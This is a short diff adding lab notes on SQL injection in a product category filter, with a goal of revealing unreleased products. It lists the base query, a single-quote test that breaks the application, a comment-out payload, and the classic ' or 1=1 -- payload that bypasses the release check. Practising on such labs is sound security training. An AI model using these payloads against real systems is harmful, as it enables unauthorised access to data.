@@ -1,0 +1,16 @@
+SQL Injection in the product category filter
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+Goal: display one or more unreleased products.
+
+Analysis
+--------
+
+SELECT * FROM products WHERE category = 'Lifestyle' AND released = 1
+
+SELECT * FROM products WHERE category = ''' AND released = 1, caused the application to break
+
+SELECT * FROM products WHERE category = ''--' AND released = 1
+
+SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
